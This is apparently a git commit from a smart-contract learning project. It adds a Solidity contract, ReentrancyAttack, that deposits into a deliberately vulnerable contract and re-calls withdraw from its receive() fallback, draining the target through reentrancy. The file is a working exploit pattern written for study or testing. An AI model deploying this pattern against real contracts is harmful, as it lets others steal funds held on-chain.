d13070741445157ca52576e69f187b069b8d88f3
KWAME <antwi1496@hotmail.com>
2024-03-07 04:53:18 -0600

    Writing, Deploying and Testing Contracts

---
+++ src/ReentrancyAttack.sol
@@ -0,0 +1,28 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.20;
+
+import {ReenterProne} from "../src/ReentrancyProne.sol";
+
+contract ReentrancyAttack {
+    ReenterProne public reenter;
+
+    constructor(address _reenterProne) {
+        reenter = ReenterProne(_reenterProne);
+    }
+
+    receive() external payable {
+        if (address(reenter).balance >= 1 ether) {
+            reenter.withdraw();
+        }
+    }
+
+    function Attack() public payable {
+        require(msg.value >= 1, "Insufficient funds");
+        reenter.deposit{value: 1 ether}();
+        reenter.withdraw();
+    }
+
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
